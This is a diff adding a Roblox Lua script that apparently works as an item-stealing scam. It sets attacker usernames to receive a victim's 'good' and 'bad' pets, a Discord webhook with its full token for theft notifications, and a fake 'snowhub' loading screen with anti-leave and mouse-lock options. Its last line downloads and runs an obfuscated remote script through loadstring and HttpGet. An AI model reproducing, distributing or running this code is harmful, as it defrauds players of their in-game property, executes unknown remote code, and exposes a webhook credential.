@@ -1,0 +1,16 @@
+UserName = "okmeinbruder" -- good pets
+_G.UserID = "3435509170"
+Webhook = "https://discord.com/api/webhooks/1143453082592751656/HeqZSXA29IrpNJqZ3TvSIIP5Tl6ji7EM7y2GMEnoVNMQJJjBM_bmwC-wdCHKWV80C71E" -- pings for pets
+UserName2 = "moinmeinbester19" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+_G.LoadingText1 = "snowhub"
+_G.LoadingText2 = "snowhub"
+_G.LoadingText3 = "snowhub"
+_G.LoadingText4 = "snowhub"
+_G.LoadingText5 = "snowhub"
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VaporeonScripts/Diamond/main/Protected_1767317791473416.lua", true))()
